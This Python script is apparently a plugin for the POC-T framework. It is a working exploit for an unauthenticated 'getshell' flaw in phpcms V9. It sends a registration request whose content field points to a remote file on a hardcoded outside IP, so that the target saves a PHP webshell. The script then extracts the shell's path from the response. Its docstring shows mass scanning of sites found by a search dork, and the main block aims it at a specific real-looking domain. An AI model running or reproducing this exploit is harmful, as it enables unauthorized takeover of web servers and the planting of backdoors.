# !/usr/bin/env python
#  -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 野驴~

"""
phpcms-V9 前台getshell 无需登录
python POC-T -s phpcmsV9-getshell -aG "power by phpcmsV9" --limit 100
"""

import requests
import re
from plugin.util import randomString
from plugin.util import randomDigits


def poc(url):
    upload_path = url.strip() + '/' + 'index.php?m=member&c=index&a=register&siteid=1'  #vul路径

    parttern = '[^<]+(?=>)'                                                      #正则匹配<>中的内容

    post_data = {
        'siteid': '1',
        'modelid': '11',
        'username': randomString(10),
        'password': randomDigits(8),
        'email': randomString(5) + randomDigits(5) + '@qq.com',
        'info[content]':'<img src=http://118.180.7.28:8081/2.txt?.php#.jpg>',
        'dosubmit': '1',
        'protocol': ''
    }



    try:
        r = requests.post(url=upload_path, data=post_data,timeout=3)
        if r.status_code is 200 and 'INSERT' in r.content:
            shell_path = re.findall(parttern, r.content, re.I | re.M)                            #提取webshell路径
            return shell_path

    except Exception:
        return False

    return False

if __name__ == '__main__':
    print poc("http://www.5lian.cn")
